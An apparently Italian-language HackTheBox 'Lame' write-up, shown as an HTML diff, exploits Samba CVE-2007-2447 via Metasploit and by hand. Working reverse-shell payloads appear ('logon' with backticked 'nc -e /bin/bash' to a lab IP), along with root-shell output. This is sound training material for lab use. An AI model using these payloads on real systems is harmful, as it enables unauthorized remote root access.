-<p>The MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the &ldquo;username map script&rdquo; smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management.</p>
-</blockquote>
-<p>Le versioni di Samba dalla 3.0.0 alla 3.0.25rc3un (incluse) inviano l&rsquo;input dell&rsquo;utente a <code>/bin/sh</code> senza validarlo prima dell&rsquo;esecuzione. Questo permette a un utente autenticato di eseguire codice arbitrario sul server (RCE).</p>
+<p>Una rapida ricerca con Google rivela che la versione di Samba installata sull&rsquo;host è vulnerabile alla <a href="https://www.samba.org/samba/security/CVE-2007-2447.html"  target="_blank" rel="noreferrer">CVE-2007-2447</a> descritta di seguito:</p>
+<blockquote><p>The MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the &ldquo;username map script&rdquo; smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management.</p>
+</blockquote><p>Le versioni di Samba dalla 3.0.0 alla 3.0.25rc3un (incluse) inviano l&rsquo;input dell&rsquo;utente a <code>/bin/sh</code> senza validarlo prima dell&rsquo;esecuzione. Questo permette a un utente autenticato di eseguire codice arbitrario sul server (RCE).</p>
 
 <h4 class="relative group">Metasploit
     <div id="metasploit-1" class="anchor"></div>
@@ -1502,7 +1469,7 @@
     </span>
     
 </h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 &gt; search Samba 3.0.20
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 &gt; search Samba 3.0.20
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">Matching <span class="nv">Modules</span>
 </span></span><span class="line"><span class="cl"><span class="o">================</span>
@@ -1512,11 +1479,11 @@
 </span></span><span class="line"><span class="cl">   <span class="m">0</span>  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba <span class="s2">&#34;username map script&#34;</span> Command Execution
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Interact with a module by name or index. For example info 0, use <span class="m">0</span> or use exploit/multi/samba/usermap_script
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 &gt; use exploit/multi/samba/usermap_script
+</span></span><span class="line"><span class="cl">Interact with a module by name or index. For example info 0, use <span class="m">0</span> or use exploit/multi/samba/usermap_script</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 &gt; use exploit/multi/samba/usermap_script
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> No payload configured, defaulting to cmd/unix/reverse_netcat
-</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> &gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> &gt; show options
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> &gt;</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> &gt; show options
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">Module options <span class="o">(</span>exploit/multi/samba/usermap_script<span class="o">)</span>:
 </span></span><span class="line"><span class="cl">
@@ -1540,8 +1507,8 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">   Id  Name
 </span></span><span class="line"><span class="cl">   --  ----
-</span></span><span class="line"><span class="cl">   <span class="m">0</span>   Automatic
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> &gt; <span class="nb">set</span> LHOST 10.10.14.5
+</span></span><span class="line"><span class="cl">   <span class="m">0</span>   Automatic</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> &gt; <span class="nb">set</span> LHOST 10.10.14.5
 </span></span><span class="line"><span class="cl"><span class="nv">LHOST</span> <span class="o">=</span>&gt; 10.10.14.5
 </span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> &gt; <span class="nb">set</span> RHOSTS 10.10.10.3
 </span></span><span class="line"><span class="cl"><span class="nv">RHOSTS</span> <span class="o">=</span>&gt; 10.10.10.3
@@ -1550,8 +1517,8 @@
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">1</span> opened <span class="o">(</span>10.10.14.5:4444 -&gt; 10.10.10.3:53413<span class="o">)</span> at 2025-12-02 06:05:18 -0500
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">id
-</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
-</span></span></code></pre></div>
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span></span></span></code></pre></div></div>
+
 <h4 class="relative group">Exploit pubblic
     <div id="exploit-pubblic" class="anchor"></div>
     
@@ -1562,7 +1529,7 @@
     
 </h4>
 <p>La ricerca con <code>searchsploit</code> mostra i seguenti exploit pubblici disponibili:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ searchsploit Samba 3.0.20
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ searchsploit Samba 3.0.20
 </span></span><span class="line"><span class="cl">------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 </span></span><span class="line"><span class="cl"> Exploit Title                                                                                                                                                          <span class="p">|</span>  Path
 </span></span><span class="line"><span class="cl">------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
@@ -1571,13 +1538,13 @@
 </span></span><span class="line"><span class="cl">Samba &lt; 3.0.20 - Remote Heap Overflow                                                                                                                                   <span class="p">|</span> linux/remote/7701.txt
 </span></span><span class="line"><span class="cl">Samba &lt; 3.6.2 <span class="o">(</span>x86<span class="o">)</span> - Denial of Service <span class="o">(</span>PoC<span class="o">)</span>                                                                                                                           <span class="p">|</span> linux_x86/dos/36741.py
 </span></span><span class="line"><span class="cl">------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-</span></span><span class="line"><span class="cl">Shellcodes: No Results
-</span></span></code></pre></div><p>L&rsquo;unico exploit disponibile per questa vulnerabilità è il modulo Metasploit usato precedentemente. In questi casi è quindi necessario cercare exploit pubblici da altre fonti.</p>
+</span></span><span class="line"><span class="cl">Shellcodes: No Results</span></span></code></pre></div></div>
+<p>L&rsquo;unico exploit disponibile per questa vulnerabilità è il modulo Metasploit usato precedentemente. In questi casi è quindi necessario cercare exploit pubblici da altre fonti.</p>
 <p>A scopo puramente didattico quando si risolve una macchina vulnerabile (qualunque sia la piattaforma che la ospita) è <strong>fortemente consigliato</strong> filtrare i risultati di ricerca in base alla data di pubblicazione. Questo permette di affrontare la macchina per come era stata pensata dall&rsquo;autore senza il rischio di incontrare anticipazioni sulla risuluzione o exploit pubblicati a posteriori da altri utenti.</p>
 <p>Nel caso di Lame la macchina è stata rilasciata su HackTheBox il 14 marzo 2017 quindi andrò a filtrare i risultati di ricerca di Google per individuare pagine web pubblicate prima di quella data. Dai primi risultati di ricerca non sembra esserci un exploit pubblico &ldquo;pronto&rdquo; per sfruttare questa vulnerabilità.</p>
 <p>Analizzando il modulo Metasploit è però possibile dedurre come attaccarla estraendo il paylaod usato per ottenere la shell e provando un apporccio più manuale. Tramite il seguente payload è posssible ottenere una revese shell sull&rsquo;host:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">logon <span class="s2">&#34;/=`nohup nc -e /bin/bash 10.10.14.2 4444`&#34;</span>
-</span></span></code></pre></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">logon <span class="s2">&#34;/=`nohup nc -e /bin/bash 10.10.14.2 4444`&#34;</span></span></span></code></pre></div></div>
+
 <h4 class="relative group">Exploit manuale
     <div id="exploit-manuale-1" class="anchor"></div>
     
@@ -1589,40 +1556,40 @@
 </h4>
 <p>Poiché non sono disponibili exploit pubblici per la vulnerabilità individuata, condurrò ora un&rsquo;analisi approfondita della CVE-2007-2447.</p>
 <p>La funzione <code>smbrun()</code> in <code>/source/lib/smbrun.c</code> non esegue correttamente l&rsquo;escape della stringa <code>cmd</code> passata come argomento a <code>execl()</code>. A causa di questo problema un attaccante può iniettare comandi arbitrari eseguendo sul server <code>/bin/sh sh -c [cmd]</code>. Di seguito una versione stringata della funzione <code>smbrun()</code> utile a comprendere il punto di iniezione:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">smbrun</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">cmd</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">outfd</span><span class="p">)</span>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">smbrun</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">cmd</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">outfd</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="kt">pid_t</span> <span class="n">pid</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="kt">uid_t</span> <span class="n">uid</span> <span class="o">=</span> <span class="n">current_user</span><span class="p">.</span><span class="n">uid</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">current_user</span><span class="p">.</span><span class="n">gid</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    
 </span></span><span class="line"><span class="cl">    <span class="c1">// ...
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    
+</span></span></span><span class="line"><span class="cl">    
 </span></span><span class="line"><span class="cl">    <span class="nf">execl</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="s">&#34;sh&#34;</span><span class="p">,</span><span class="s">&#34;-c&#34;</span><span class="p">,</span><span class="n">cmd</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    
 </span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">82</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>Dalla descrizione della vulnerabilità il pre-requisito per attaccarla con successo è quello di essere autenticati: in questo caso il server permette il login anonimo.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ smbclient //<span class="nv">$IP</span>/tmp
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>Dalla descrizione della vulnerabilità il pre-requisito per attaccarla con successo è quello di essere autenticati: in questo caso il server permette il login anonimo.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ smbclient //<span class="nv">$IP</span>/tmp
 </span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\k</span>ali<span class="o">]</span>:
 </span></span><span class="line"><span class="cl">Anonymous login successful
 </span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
-</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span>
-</span></span></code></pre></div><p>Per ottenere una reverse shell dall&rsquo;host è necessario mettersi in ascolto localmente sulla porta 4444 tramite <code>nc</code> come mostrato in seguito:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nc -lvp <span class="m">4444</span>         
-</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
-</span></span></code></pre></div><p>Inviando ad il seguente payload si ottiene una shell sul target:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> logon <span class="s2">&#34;/`nc -e /bin/bash 10.10.14.6 4444`&#34;</span>
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span></span></span></code></pre></div></div>
+<p>Per ottenere una reverse shell dall&rsquo;host è necessario mettersi in ascolto localmente sulla porta 4444 tramite <code>nc</code> come mostrato in seguito:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nc -lvp <span class="m">4444</span>         
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...</span></span></code></pre></div></div>
+<p>Inviando ad il seguente payload si ottiene una shell sul target:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> logon <span class="s2">&#34;/`nc -e /bin/bash 10.10.14.6 4444`&#34;</span>
 </span></span><span class="line"><span class="cl">Password: 
 </span></span><span class="line"><span class="cl">session setup failed: NT_STATUS_IO_TIMEOUT
-</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nc -lvp <span class="m">4444</span>         
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nc -lvp <span class="m">4444</span>         
 </span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
 </span></span><span class="line"><span class="cl">10.10.10.3: inverse host lookup failed: Unknown host
 </span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.2<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.3<span class="o">]</span> <span class="m">53346</span>
 </span></span><span class="line"><span class="cl">id
-</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
-</span></span></code></pre></div>
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span></span></span></code></pre></div></div>
+
 <h2 class="relative group">User flag
     <div id="user-flag" class="anchor"></div>
     
@@ -1656,10 +1623,10 @@
 </h2>
 <p>Ora che ho ottenuto l&rsquo;accesso locale alla macchina come utente <code>root</code> posso invesitgare sul perché non è stato possibile sfruttare la backdoor in vsFTPd 2.3.4.</p>
 <p>Tramite <code>netstat</code> vengono mostrati le porte in ascolto sul server e i relativi servizi in esecuzione. Filtrando l&rsquo;output con <code>grep</code> si nota che la porta 6200 TCP è stata correttamente aperta come previsto:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ netstat -ltunp <span class="p">|</span> grep <span class="m">6200</span>
-</span></span><span class="line"><span class="cl">tcp    <span class="m">0</span>    <span class="m">0</span> 0.0.0.0:6200    0.0.0.0:*    LISTEN    10198/vsftpd 
-</span></span></code></pre></div><p>Tuttavia tramite <code>iptables</code> si scopre che sul server è attivo il firewall UFW (Uncomplicated Firewall) che impedisce la connessione dall&rsquo;esterno alla porta 6200. Dall&rsquo;outptut si scopre che solo le seguenti porte sono raggiungibili dall&rsquo;esterno e queste coincidono con quelle individuate precedentemente con la scansione <code>nmap</code> del server:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ iptables -L -v -n
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ netstat -ltunp <span class="p">|</span> grep <span class="m">6200</span>
+</span></span><span class="line"><span class="cl">tcp    <span class="m">0</span>    <span class="m">0</span> 0.0.0.0:6200    0.0.0.0:*    LISTEN    10198/vsftpd </span></span></code></pre></div></div>
+<p>Tuttavia tramite <code>iptables</code> si scopre che sul server è attivo il firewall UFW (Uncomplicated Firewall) che impedisce la connessione dall&rsquo;esterno alla porta 6200. Dall&rsquo;outptut si scopre che solo le seguenti porte sono raggiungibili dall&rsquo;esterno e queste coincidono con quelle individuate precedentemente con la scansione <code>nmap</code> del server:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ iptables -L -v -n
 </span></span><span class="line"><span class="cl">...
 </span></span><span class="line"><span class="cl">Chain ufw-user-input <span class="o">(</span><span class="m">1</span> references<span class="o">)</span>
 </span></span><span class="line"><span class="cl"> pkts bytes target     prot opt in     out     <span class="nb">source</span>               destination         
@@ -1672,8 +1639,8 @@
 </span></span><span class="line"><span class="cl">    <span class="m">0</span>     <span class="m">0</span> ACCEPT     udp  --  *      *       0.0.0.0/0            0.0.0.0/0           udp dpt:139 
 </span></span><span class="line"><span class="cl">  <span class="m">387</span> <span class="m">18916</span> ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0           tcp dpt:445 
 </span></span><span class="line"><span class="cl">    <span class="m">0</span>     <span class="m">0</span> ACCEPT     udp  --  *      *       0.0.0.0/0            0.0.0.0/0           udp dpt:445 
-</span></span><span class="line"><span class="cl"> 599K   26M RETURN     all  --  *      *       0.0.0.0/0            0.0.0.0/0
-</span></span></code></pre></div>
+</span></span><span class="line"><span class="cl"> 599K   26M RETURN     all  --  *      *       0.0.0.0/0            0.0.0.0/0</span></span></code></pre></div></div>
+
           
           
           
